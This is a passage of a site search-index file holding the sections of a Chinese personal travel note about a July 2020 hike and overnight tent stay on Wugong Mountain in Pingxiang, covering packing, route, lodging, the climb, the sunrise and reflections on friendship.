\u51cc\u6668\u4e94\u70b9\u4e09\u5341\u4e03\uff0c\u6211\u7b2c\u4e00\u6b21\u770b\u89c1\u4e86\u65e5\u51fa\u7684\u666f\u8c61\u3002\u592a\u9633\u521a\u51fa\u6765\u65f6\uff0c\u4e0d\u662f\u6211\u4eec\u5e73\u65f6\u770b\u89c1\u7684\u9ec4\u767d\u8272\uff0c\u800c\u662f\u4e00\u7247\u706b\u7ea2\u3002 \u592a\u9633\u5b8c\u5168\u5347\u8d77\u4e4b\u540e\uff0c\u5c31\u662f\u8003\u9a8c\u5927\u5bb6\u62cd\u7167\u59ff\u52bf\u50a8\u5907\u91cf\u7684\u65f6\u5019\u4e86\u3002 \u7a7f\u7740\u51b2\u950b\u8863\u7684\u7a0b\u5e8f\u5458\u6b32\u5c066000\u6444\u6c0f\u5ea6\u7684\u6052\u661f\u541e\u4e0b\u4ee5\u63a2\u5bfbJava\u7684\u8d77\u6e90\u3002 \u731b\u7537\u5fd7\u6d69\u9762\u5bf9\u592a\u9633\u601d\u8003\u7740\u4ec0\u4e48\u65f6\u5019\u5c0f\u5356\u90e8\u80fd\u63a8\u51fa\u706b\u5c71\u77f3\u70e4\u80a0\u3002 \u4e3a\u4e86\u6784\u56fe\u5f62\u6210\u9ec4\u91d1\u5206\u5272\u7ebf\u51f9\u4e8610\u5206\u949f\u9020\u578b\u7684\u9753\u6960\u3002 \u8fd8\u6709\u771f\u7684\u5f88\u4e25\u683c\u5730\u5728\u9009\u6ee4\u955c\u7684\u7b11\u7b11\u3002 4. \u603b\u7ed3 # \u524d\u6bb5\u65f6\u95f4\u8d70\u7ea2\u7684\u590d\u65e6\u5927\u5b66\u9648\u679c\u6559\u6388\u8bf4\uff0c \u670b\u53cb\u662f\u65e0\u7528\u4e4b\u7528 \uff0c\u867d\u4e0d\u65f6\u5e38\u60f3\u8d77\uff0c\u4f46\u5374\u65e0\u5904\u4e0d\u5728\u3002\u9648\u6d77\u8d24\u8001\u5e08\u8bf4\uff0c\u5728\u5173\u7cfb\u4e2d\uff0c \u628a\u522b\u4eba\u5f53\u505a\u966a\u4f34\uff0c\u751a\u81f3\u90fd\u662f\u4e00\u79cd\u7269\u5316 \uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u522b\u4eba\u4e0d\u80fd\u966a\u4f34\u4f60\u7684\u65f6\u5019\uff0c\u5173\u7cfb\u4fbf\u5931\u53bb\u4e86\u610f\u4e49\u3002 \u5373\u5c06\u6bd5\u4e1a\u6216\u5df2\u7ecf\u6bd5\u4e1a\u7684\u6211\u4eec\uff0c\u90fd\u5df2\u8bb8\u4e45\u672a\u89c1\uff0c\u805a\u5728\u4e00\u8d77\u8fd8\u662f\u5982\u6b64\u5730\u5f00\u5fc3\u548c\u6709\u8da3\uff0c\u867d\u7136\u5404\u81ea\u6709\u5404\u81ea\u7684\u70e6\u607c\uff0c\u4f46\u90fd\u62e5\u6709\u7740\u8d70\u4e0b\u53bb\u7684\u4fe1\u5fc3\u548c\u52c7\u6c14\u3002 \u6211\u6000\u5ff5\u8fd9\u6837\u7684\u65e5\u5b50\u3002","title":"1.2020 7 14 \u840d\u4e61\u6b66\u529f\u5c71"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#2020714","text":"","title":"2020.7.14 \u840d\u4e61\u6b66\u529f\u5c71"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#_1","text":"2020.7.14 \u840d\u4e61\u6b66\u529f\u5c71 \u76ee\u5f55 1. \u80cc\u666f 2. \u51fa\u884c\u51c6\u5907 2.1. \u91c7\u8d2d\u7269\u54c1 2.2. \u4ea4\u901a\u8def\u7ebf 2.3. \u4f4f\u5bbf\u5b89\u6392 3. \u767b\u5c71\u4e4b\u65c5 3.1. \u5230\u8fbe 3.2. \u4e2d\u5eb5\u7d22\u9053 3.3. \u7b2c\u4e00\u6bb5\u6b65\u884c 3.4. \u91d1\u9876\u7d22\u9053 3.5. \u7b2c\u4e8c\u6bb5\u6b65\u884c 3.6. \u767b\u9876 4. \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#1","text":"2020\u5e747\u670810\u65e5\u665a\u4e0a10\u70b921\u5206 \uff0c\u6211\u7684\u9ad8\u4e2d\u540c\u5b66\u7b11\u7b11\u95ee\u6211 7\u670814\u65e5 \u60f3\u4e0d\u60f3\u53bb\u722c\u5c71\u3002\u8054\u60f3\u5230\u73b0\u5728\u5bf9\u722c\u5c71\u7684\u5b9a\u4e49\uff0c\u6211\u4e0d\u7981\u5fc3\u4e2d\u4e00\u7d27\uff0c\u6e05\u7b97\u7740\u6211\u4eec\u662f\u4e0d\u662f\u6709\u4ec0\u4e48\u672a\u89e3\u51b3\u7684\u6069\u6028\uff0c\u76f4\u5230\u5979\u628a\u76ee\u7684\u5730\u3001\u884c\u7a0b\u548c\u540c\u884c\u4eba\u5458\u53d1\u7ed9\u6211\uff0c\u6211\u624d\u786e\u4fe1\u8fd9\u662f\u4e00\u6b21 \u4f20\u7edf\u610f\u4e49\u4e0a\u7684\u722c\u5c71\u6d3b\u52a8 \uff0c\u4e8e\u662f\u6b23\u7136\u63a5\u53d7\u3002 \u6211\u4eec\u8ba1\u5212\u7684\u884c\u7a0b\u662f7\u670814\u65e5\u4ece\u8d63\u5dde\u51fa\u53d1\uff0c\u81ea\u9a7e\u524d\u5f80\u840d\u4e61\u6b66\u529f\u5c71\u666f\u533a\uff0c\u5f53\u5929\u5728\u5c71\u9876\u5165\u4f4f\u91d1\u9876\u5e10\u7bf7\uff0c\u7b2c\u4e8c\u5929\u4e0b\u5c71\u4f11\u606f\uff0c7\u670816\u65e5\u8fd4\u56de\u3002\u5728\u4e0b\u5c71\u7684\u8def\u4e0a\uff0c\u6211\u60f3\u5230\u53ef\u4ee5\u5199\u4e00\u7bc7\u6e38\u8bb0\u6765\u8bb0\u5f55\u6b64\u6b21\u7684\u65c5\u884c\u611f\u53d7\uff0c\u4f46\u8fd9\u5bf9\u4e60\u60ef\u5199\u6280\u672f\u535a\u5ba2\u7684\u6211\u6765\u8bf4\u7740\u5b9e\u6709\u4e9b\u56f0\u96be\u3002\u4e8e\u662f\uff0c\u6211\u53c2\u8003\u4e86\u4e00\u4e9b\u5176\u4ed6\u6e38\u5ba2\u6240\u5199\u7684\u6e38\u8bb0\uff0c\u8fd8\u6709\u4e00\u4e9b\u51fa\u7248\u7684\u6e38\u8bb0\u4f5c\u54c1\uff0c\u6700\u7ec8\u5199\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u5e0c\u671b\u80fd\u591f\u7ed9\u60f3\u8981\u53bb\u6b66\u529f\u5c71\u65c5\u6e38\u7684\u670b\u53cb\u63d0\u4f9b\u4e00\u4e9b\u53c2\u8003\u3002","title":"1. \u80cc\u666f"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#2","text":"","title":"2. \u51fa\u884c\u51c6\u5907"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#21","text":"\u8981\u5916\u51fa\u767b\u5c71\uff0c\u8fd8\u662f\u5728\u5c71\u9876\u9732\u8425\uff0c\u5fc5\u7136\u8981\u51c6\u5907\u4e00\u4e9b\u7269\u54c1\uff0c\u4e0b\u9762\u662f\u6211\u5217\u51fa\u7684\u91c7\u8d2d\u6e05\u5355\u3002 [x] \u5e3d\u5b50 [x] \u957f\u8863\u957f\u88e4 \uff0d\u906e\u9633 [x] \u9632\u6652\u8863 [x] \u9632\u6652\u971c [x] \u51b2\u950b\u8863 \uff0d \u5c71\u9876\u6e29\u5ea6\u6bd4\u5c71\u4e0b\u4f4e12\u5ea6\u5de6\u53f3\uff0c\u591c\u95f4\u5916\u51fa\u9700\u8981\u9632\u98ce\u4fdd\u6696\u7684\u8863\u7269 [x] \u6d17\u6f31\u7528\u54c1\u65c5\u884c\u88c5 \uff0d \u5c71\u9876\u6709\u6d17\u6fa1\u95f4\uff0c20\u514310\u5206\u949f [x] \u5bc6\u5c01\u888b \uff0d \u9694\u79bb\u6362\u4e0b\u6765\u7684\u8863\u7269\uff0c\u8fd8\u80fd\u7528\u6765\u5bc6\u5c01\u978b\u5b50\uff0c\u9632\u6b62\u5728\u591c\u95f4\u88ab\u9732\u6c34\u6253\u6e7f [x] \u521b\u53ef\u8d34 [x] \u6bcf\u4eba\u4e24\u74f6\u6c34 [x] \u4e00\u76d2\u7eb8\u5dfe [x] \u5c0f\u96f6\u98df \uff0d \u4e0a\u5c71\u9014\u4e2d\u8865\u5145\u80fd\u91cf [x] \u767b\u5c71\u6756 \uff0d \u8ba9\u53cc\u624b\u80fd\u591f\u5206\u62c5\u817f\u90e8\u53d7\u529b\uff0c\u4fdd\u62a4\u819d\u76d6 [x] \u73b0\u91d1200 \uff0d \u5c71\u4e0a\u53ea\u6709\u79fb\u52a8\u6709\u4fe1\u53f7\uff0c\u65f6\u65ad\u65f6\u7eed\uff0c\u5e26\u73b0\u91d1\u4ee5\u5907\u4e0d\u65f6\u4e4b\u9700 [x] \u624b\u7535\u7b52 \uff0d \u591c\u95f4\u7167\u660e [x] \u8eab\u4efd\u8bc1 \uff0d \u8d2d\u7968\u9700\u8981 [x] \u82b1\u9732\u6c34 \uff0d \u9632\u868a [x] \u7761\u888b \uff0d \u6bcf\u4e2a\u5e10\u7bf7\u914d\u4e00\u5e8a\u68c9\u88ab\u548c\u4e00\u4e2a\u7761\u888b\uff0c\u4e0d\u7ecf\u5e38\u6362\u6d17\uff0c\u81ea\u5df1\u5e26\u7761\u888b\u4e0a\u53bb\u6bd4\u8f83\u5e72\u51c0\u536b\u751f [x] \u964d\u566a\u8033\u673a\u6216\u8033\u585e \uff0d \u5e10\u7bf7\u653e\u7f6e\u5bc6\u96c6\uff0c\u4e14\u4e0d\u9694\u97f3\uff0c\u591c\u95f4\u5608\u6742 [x] \u4e00\u6b21\u6027\u96e8\u8863 \uff0d \u5c71\u4e0a\u5e38\u5e74\u6709\u96e8 [x] \u9632\u6c34\u978b\u6216\u96e8\u978b\u5957","title":"2.1. \u91c7\u8d2d\u7269\u54c1"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#22","text":"\u6211\u4eec\u662f\u4ece\u8d63\u5dde\u81ea\u9a7e\u8fc7\u53bb\u7684\uff0c\u65e9\u4e0a\u516b\u70b9\u51fa\u53d1\uff0c\u4e0b\u5348\u56db\u70b9\u5230\u8fbe\u3002\u6211\u4eec\u4f7f\u7528\u767e\u5ea6\u5730\u56fe\u5bfc\u822a\uff0c\u4ece\u840d\u4e61\u4e0b\u9ad8\u901f\u5230\u6b66\u529f\u5c71\u7684\u8def\u7279\u522b\u4e0d\u597d\u8d70\uff0c\u540e\u6765\u53d1\u73b0\u7528\u9ad8\u5fb7\u5730\u56fe\u53ef\u4ee5\u8d70\u4e00\u6761\u597d\u8d70\u8bb8\u591a\u7684\u9053\u8def\u3002 \u770b\u6765\u767e\u5ea6\u5728\u66f4\u65b0\u8def\u7ebf\u4e0a\u7684\u5de5\u4f5c\u8fd8\u662f\u6ca1\u6709\u9ad8\u5fb7\u7684\u6295\u5165\u5927\u3002","title":"2.2. \u4ea4\u901a\u8def\u7ebf"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#23","text":"\u6211\u4eec\u8d2d\u4e70\u7684\u662f\u666f\u533a\u95e8\u7968\u548c\u91d1\u9876\u5e10\u7bf7\u7684\u5957\u7968\uff0c\u6bcf\u4e24\u4eba245\u3002\u91d1\u9876\u5e10\u7bf7\u5728\u6cbf\u7740\u4e0a\u5c71\u8def\u5f84\u5230\u8fbe\u91d1\u9876\u4ee5\u540e\u5f80\u4e0b\u770b\u5c31\u80fd\u770b\u5230\uff0c\u9700\u8981 \u5148\u53bb2\u53f7\u697c\u901a\u8fc7\u8eab\u4efd\u8bc1\u529e\u7406\u5165\u4f4f \uff0c\u7136\u540e\u53bb\u6307\u5b9a\u7684\u697c\u6311\u9009\u5e10\u7bf7\u5e76\u9886\u53d6\u7269\u54c1\uff0c\u4e00\u5e8a\u68c9\u88ab\uff0c\u4e00\u4e2a\u7761\u888b\u548c\u4e00\u4e2a\u9632\u6f6e\u57ab\u3002","title":"2.3. \u4f4f\u5bbf\u5b89\u6392"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#3","text":"","title":"3. \u767b\u5c71\u4e4b\u65c5"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#31","text":"\u5230\u8fbe\u6e38\u5ba2\u670d\u52a1\u4e2d\u5fc3\u4ee5\u540e\uff0c\u4e58\u5750\u5df4\u8f66\uff0c20\u5206\u949f\u5de6\u53f3\u5230\u8fbe\u5c71\u811a\u3002 \u5c71\u811a\u4e0b\u7684\u724c\u697c\u5b88\u62a4\u7740\u8fdc\u5904\u7684\u9ad8\u5c71\uff0c\u7ed9\u4eba\u4ee5\u5dcd\u5ce8\u4e4b\u611f\u3002 \u6b66\u529f\u5c71\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u65f6\u4e0d\u65f6\u7ed9\u4eba\u60ca\u559c\u7684\u5730\u65b9\u3002\u8de8\u4e0a\u4e00\u6bb5\u53f0\u9636\uff0c\u8d70\u8fc7\u4e00\u6761\u6808\u9053\uff0c\u6216\u8bb8\u4fbf\u6709\u522b\u81f4\u7684\u666f\u8272\u5728\u7b49\u5f85\u7740\u4f60\u3002","title":"3.1. \u5230\u8fbe"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#32","text":"\u8fc7\u4e86\u724c\u697c\uff0c\u4fbf\u662f\u4e2d\u5eb5\u7d22\u9053\uff0c\u6211\u4eec\u60a0\u95f2\u5730\u5750\u5728\u7f06\u8f66\u4e0a\uff0c\u88ab\u7fa4\u5c71\u6240\u73af\u7ed5\uff0c \u811a\u4e0b\u94fa\u5f00\u4e00\u7247\u6797\u6d77\uff0c\u5934\u9876\u7f69\u7740\u4e00\u7247\u4e91\u6d77 \u3002\u7f06\u8f66\u4e00\u5171\u5f00\u4e8610\u5206\u949f\uff0c\u5c31\u50cf\u843d\u5165\u4e86\u300a\u7231\u4e3d\u4e1d\u6f2b\u6e38\u4ed9\u5883\u300b\u4e2d\u7684\u5154\u5b50\u6d1e\uff0c\u79bb\u771f\u5b9e\u4e16\u754c\u7684\u8ddd\u79bb\u9010\u6e10\u62c9\u8fdc\u3002\u968f\u4e4b\u4e00\u540c\u62c9\u8fdc\u7684\uff0c\u8fd8\u6709\u9753\u6960\u56e0\u4e3a\u975e\u5178\u578b\u6027\u8f7b\u5ea6\u6050\u9ad8\u75c7\u800c\u53d1\u51fa\u7684\u9635\u9635\u5c16\u53eb\u3002","title":"3.2. \u4e2d\u5eb5\u7d22\u9053"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#33","text":"\u4ece\u7f06\u8f66\u4e0a\u4e0b\u6765\uff0c\u4f20\u7edf\u610f\u4e49\u4e0a\u7684\u722c\u5c71\u5c31\u8981\u5f00\u59cb\u4e86\u3002\u7d22\u9053\u51fa\u53e3\u5904\u7ad9\u7740\u4e00\u4e9b\u6311\u592b\u548c\u8f7f\u592b\uff0c\u4ed6\u4eec\u7684\u624b\u81c2\u4e0a\u6709\u7740\u866c\u7ed3\u7684\u808c\u8089\uff0c\u5c0f\u817f\u4e0a\u7684\u8840\u7ba1\u7a81\u51fa\uff0c\u80a9\u5934\u56e0\u4e3a\u957f\u671f\u62c5\u8d1f\u91cd\u7269\u800c\u5fae\u5fae\u9686\u8d77\u3002 \u4ed6\u4eec\u7528\u70ed\u5207\u7684\u773c\u5149\u770b\u7740\u6211\u4eec\uff0c\u9ad8\u58f0\u5730\u95ee\u6211\u4eec\u8981\u4e0d\u8981\u5750\u8f7f\u5b50\u4e0a\u5c71 \u3002 \u4e00\u8def\u821f\u8f66\u52b3\u987f\uff0c\u518d\u52a0\u4e0a\u643a\u5e26\u7684\u884c\u674e\u6709\u4e0d\u5c0f\u7684\u91cd\u91cf\uff0c\u6211\u4eec\u7565\u5fae\u6709\u4e9b\u5fc3\u52a8\uff0c\u8be2\u95ee\u4e86\u4e00\u4e0b\u4ef7\u683c\uff0c 460\u4e00\u4f4d \u3002\u4e00\u65f6\u95f4\uff0c\u6211\u4eec\u8170\u4e5f\u4e0d\u9178\u4e86\uff0c\u817f\u4e5f\u4e0d\u75bc\u4e86\uff0c\u884c\u674e\u81ea\u5df1\u4e5f\u80fd\u625b\u4e86\u3002 \u4e00\u4f4d\u6bd4\u8f83\u80fd\u8bf4\u7684\u8f7f\u592b\u770b\u6211\u4eec\u662f\u6f5c\u5728\u5ba2\u6237\uff0c\u4e00\u8def\u8ddf\u4e86\u6211\u4eec5\u5206\u949f\uff0c\u7528\u5938\u5f20\u7684\u8bed\u6c14\u548c\u795e\u60c5\u5411\u8be2\u95ee\u4ef7\u683c\u7684\u7b11\u7b11\u63cf\u8ff0\u7740\u4e0a\u5c71\u8def\u9014\u4e4b\u51f6\u9669\u3002 \u6211\u60f3\uff0c\u5982\u679c\u662f\u4ed6\u6765\u5199\u8fd9\u7bc7\u6e38\u8bb0\u7684\u8bdd\uff0c\u6211\u4eec\u7684\u65c5\u9014\u5e94\u5f53\u4f1a\u663e\u5f97\u523a\u6fc0\u8bb8\u591a \u3002 \u88ab\u4e00\u8def\u8ffd\u968f\u7684\u6211\u4eec\u4e5f\u6709\u4e9b\u4e0d\u80dc\u5176\u6270\uff0c\u4e8e\u662f\u6211\u5f00\u59cb\u5411\u5927\u54e5\u6781\u529b\u63cf\u5199\u7740\u7b11\u7b11\u662f\u5982\u4f55\u5730\u56fa\u6267\uff0c \u5f53\u5e74\u5728\u5b66\u6821\u6709\u591a\u5c11\u7eaf\u60c5\u7684\u5c0f\u7537\u751f\u8d39\u5c3d\u5fc3\u601d\u5730\u60f3\u8981\u8ffd\u5979\u90fd\u6ca1\u6709\u6210\u529f\uff0c\u4e0d\u53ef\u80fd\u88ab\u5927\u54e5\u4e0a\u4e2a\u5c71\u5c31\u8ffd\u4e0a\u7684 \uff0c\u8fd8\u6709\u521a\u521a\u4ece\u7d22\u9053\u51fa\u53e3\u51fa\u6765\u7684\u5c0f\u59b9\u59b9\u662f\u5982\u4f55\u5730\u67d4\u5f31\uff0c\u5927\u54e5\u5982\u679c\u518d\u4e0d\u53bb\u62c9\u5ba2\u7684\u8bdd\u5c31\u8981\u88ab\u522b\u4eba\u62a2\u8d70\u751f\u610f\u4e86\u3002 \u6bd5\u7adf\u6211\u4e5f\u662f\u5728\u5546\u79d1\u8bfb\u8fc7\u4e24\u5e74\uff0c\u9500\u552e\u8bdd\u672f\u8bf4\u8d77\u6765\u4e5f\u662f\u4e00\u5957\u4e00\u5957\u7684\uff0c\u5927\u54e5\u542c\u5b8c\u7565\u6709\u6240\u601d\uff0c\u89c9\u5f97\u6211\u8bf4\u5f97\u6709\u9053\u7406\uff0c\u4e8e\u662f\u4fbf\u4e0b\u5c71\u53bb\u627e\u5c0f\u59b9\u59b9\u4e86\u3002\u6211\u677e\u4e86\u4e00\u53e3\u6c14\uff0c\u628a\u4ece\u5305\u91cc\u638f\u51fa\u6765\u51c6\u5907\u753b SWOT\u5206\u6790 \u7684\u7eb8\u548c\u7b14\u653e\u4e86\u56de\u53bb\u3002 \u6b66\u529f\u5c71\u6700\u5927\u7684\u7279\u70b9\u5728\u7b2c\u4e00\u6bb5\u6b65\u884c\u9014\u4e2d\u4fbf\u9010\u6e10\u663e\u73b0\u51fa\u6765\uff0c \u9ad8\u5904\u591a\u4e91\u96fe \u3002 \u4e00\u9897\u677e\u6811\u4f18\u96c5\u5730\u957f\u5728\u6808\u9053\u7684\u4e2d\u95f4\uff0c \u679d\u53f6\u5411\u5929\u7a7a\u4f38\u5c55 \u3002 \u5c71\u8272\u5cbf\u7136\u4e0d\u52a8\uff0c\u6d6e\u4e91\u53d8\u5316\u591a\u7aef\u3002\u5f80\u6765\u5982\u7ec7\u7684\u6e38\u5ba2\u4eec\u62cd\u4e0b\u7684\u5c71\u666f\u6216\u8bb8\u5927\u540c\u5c0f\u5f02\uff0c\u5374\u4eab\u6709\u7740\u72ec\u6b64\u4e00\u4efd\u7684\u5929\u7a7a\uff0c\u8fd9\u53ef\u80fd\u4e5f\u7b97\u662f\u6b66\u529f\u5c71\u7ed9\u6e38\u5ba2\u4eec\u7684\u5b9a\u5236\u5316\u4f53\u9a8c\u5427\u3002","title":"3.3. \u7b2c\u4e00\u6bb5\u6b65\u884c"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#34","text":"\u6211\u4e5f\u4e0d\u77e5\u9053\u8fd9\u5f20\u4e0b\u5c71\u65f6\u62cd\u7684\u7167\u7247\u662f\u4e0d\u662f\u91d1\u9876\u7d22\u9053\uff0c\u53cd\u6b63\u662f\u7d22\u9053\u5c31\u5bf9\u4e86\u3002","title":"3.4. \u91d1\u9876\u7d22\u9053"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#35","text":"\u4ece\u91d1\u9876\u7d22\u9053\u7684\u7f06\u8f66\u4e0a\u4e0b\u6765\uff0c\u6d77\u62d4\u5df2\u7ecf\u67091600\u7c73\uff0c\u5269\u4e0b\u7684\u8def\u5c31\u4e0d\u591a\u4e86\u3002 \u4f53\u529b\u5145\u6c9b\u7684\u5fd7\u6d69\u8def\u9014\u603b\u662f\u9886\u5148\u6211\u4eec\u8bb8\u591a\uff0c\u4f46\u662f\u4ed6\u53ea\u8981\u4e00\u9047\u5230\u5c0f\u5356\u90e8\u5c31\u4f1a\u5fcd\u4e0d\u4f4f\u8fdb\u53bb\u901b\u4e00\u901b\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u8981\u770b\u5230\u5c0f\u5356\u90e8\uff0c\u5c31\u77e5\u9053\u6211\u4eec\u53c8\u53ef\u4ee5\u8ffd\u4e0a\u4ed6\u4e86\uff0c\u987a\u4fbf\u5728\u4ed6\u7684\u76db\u60c5\u9080\u8bf7\u4e0b\u6765\u4e00\u74f6\u53ef\u4e50\u548c\u4e00\u6839\u70e4\u80a0\u3002 \u63a5\u8fd1\u5c71\u9876\u65f6\uff0c\u6211\u4eec\u80fd\u591f\u770b\u5230\u4e00\u6761\u5c0f\u8def\uff0c\u5b83\u662f\u9ad8\u5c71\u8349\u7538\u548c\u6797\u5e26\u7684\u5206\u754c\u7ebf\uff0c\u81ea\u7136\u548c\u4eba\u5de5\u76f8\u914d\u5408\u5f62\u6210\u7684\u6b64\u756a\u666f\u8272\uff0c\u9887\u4e3a\u522b\u81f4\u3002 \u592a\u9633\u4e00\u51fa\u6765\uff0c\u4e91\u96fe\u5f00\u59cb\u5411\u4e0a\u6d88\u6563\u3002\u821e\u53f0\u4e0a\u5927\u6982\u662f\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u5e72\u51b0\u6765\u5236\u9020\u7279\u6548\u7684\u3002","title":"3.5. \u7b2c\u4e8c\u6bb5\u6b65\u884c"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#36","text":"\u8d70\u8fc7\u6700\u540e\u4e00\u6761\u6808\u9053\uff0c\u6211\u4eec\u5c31\u6765\u5230\u4e86\u91d1\u9876\u3002\u7d27\u8d76\u6162\u8d76\uff0c\u4e00\u5171\u82b1\u4e862\u5c0f\u65f640\u5206\u949f\u3002\u4ece\u91d1\u9876\u5f80\u4e0b\u770b\uff0c\u6700\u8fd1\u7684\u662f\u767d\u9e64\u5cf0\u5e10\u7bf7\uff0c\u518d\u4e0b\u4e00\u5c42\u624d\u662f\u91d1\u9876\u5e10\u7bf7\u3002 \u4f11\u6574\u4e00\u591c\uff0c\u51cc\u6668\u56db\u70b9\u534a\uff0c\u7aa5\u89c1\u4e86\u915d\u917f\u7740\u65e5\u51fa\u7684\u5929\u7a7a\u3002 \u51cc\u6668\u4e94\u70b9\u4e09\u5341\u4e03\uff0c\u6211\u7b2c\u4e00\u6b21\u770b\u89c1\u4e86\u65e5\u51fa\u7684\u666f\u8c61\u3002\u592a\u9633\u521a\u51fa\u6765\u65f6\uff0c\u4e0d\u662f\u6211\u4eec\u5e73\u65f6\u770b\u89c1\u7684\u9ec4\u767d\u8272\uff0c\u800c\u662f\u4e00\u7247\u706b\u7ea2\u3002 \u592a\u9633\u5b8c\u5168\u5347\u8d77\u4e4b\u540e\uff0c\u5c31\u662f\u8003\u9a8c\u5927\u5bb6\u62cd\u7167\u59ff\u52bf\u50a8\u5907\u91cf\u7684\u65f6\u5019\u4e86\u3002 \u7a7f\u7740\u51b2\u950b\u8863\u7684\u7a0b\u5e8f\u5458\u6b32\u5c066000\u6444\u6c0f\u5ea6\u7684\u6052\u661f\u541e\u4e0b\u4ee5\u63a2\u5bfbJava\u7684\u8d77\u6e90\u3002 \u731b\u7537\u5fd7\u6d69\u9762\u5bf9\u592a\u9633\u601d\u8003\u7740\u4ec0\u4e48\u65f6\u5019\u5c0f\u5356\u90e8\u80fd\u63a8\u51fa\u706b\u5c71\u77f3\u70e4\u80a0\u3002 \u4e3a\u4e86\u6784\u56fe\u5f62\u6210\u9ec4\u91d1\u5206\u5272\u7ebf\u51f9\u4e8610\u5206\u949f\u9020\u578b\u7684\u9753\u6960\u3002 \u8fd8\u6709\u771f\u7684\u5f88\u4e25\u683c\u5730\u5728\u9009\u6ee4\u955c\u7684\u7b11\u7b11\u3002","title":"3.6. \u767b\u9876"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/#4","text":"\u524d\u6bb5\u65f6\u95f4\u8d70\u7ea2\u7684\u590d\u65e6\u5927\u5b66\u9648\u679c\u6559\u6388\u8bf4\uff0c \u670b\u53cb\u662f\u65e0\u7528\u4e4b\u7528 \uff0c\u867d\u4e0d\u65f6\u5e38\u60f3\u8d77\uff0c\u4f46\u5374\u65e0\u5904\u4e0d\u5728\u3002\u9648\u6d77\u8d24\u8001\u5e08\u8bf4\uff0c\u5728\u5173\u7cfb\u4e2d\uff0c \u628a\u522b\u4eba\u5f53\u505a\u966a\u4f34\uff0c\u751a\u81f3\u90fd\u662f\u4e00\u79cd\u7269\u5316 \uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u522b\u4eba\u4e0d\u80fd\u966a\u4f34\u4f60\u7684\u65f6\u5019\uff0c\u5173\u7cfb\u4fbf\u5931\u53bb\u4e86\u610f\u4e49\u3002 \u5373\u5c06\u6bd5\u4e1a\u6216\u5df2\u7ecf\u6bd5\u4e1a\u7684\u6211\u4eec\uff0c\u90fd\u5df2\u8bb8\u4e45\u672a\u89c1\uff0c\u805a\u5728\u4e00\u8d77\u8fd8\u662f\u5982\u6b64\u5730\u5f00\u5fc3\u548c\u6709\u8da3\uff0c\u867d\u7136\u5404\u81ea\u6709\u5404\u81ea\u7684\u70e6\u607c\uff0c\u4f46\u90fd\u62e5\u6709\u7740\u8d70\u4e0b\u53bb\u7684\u4fe1\u5fc3\u548c\u52c7\u6c14\u3002 \u6211\u6000\u5ff5\u8fd9\u6837\u7684\u65e5\u5b50\u3002","title":"4. 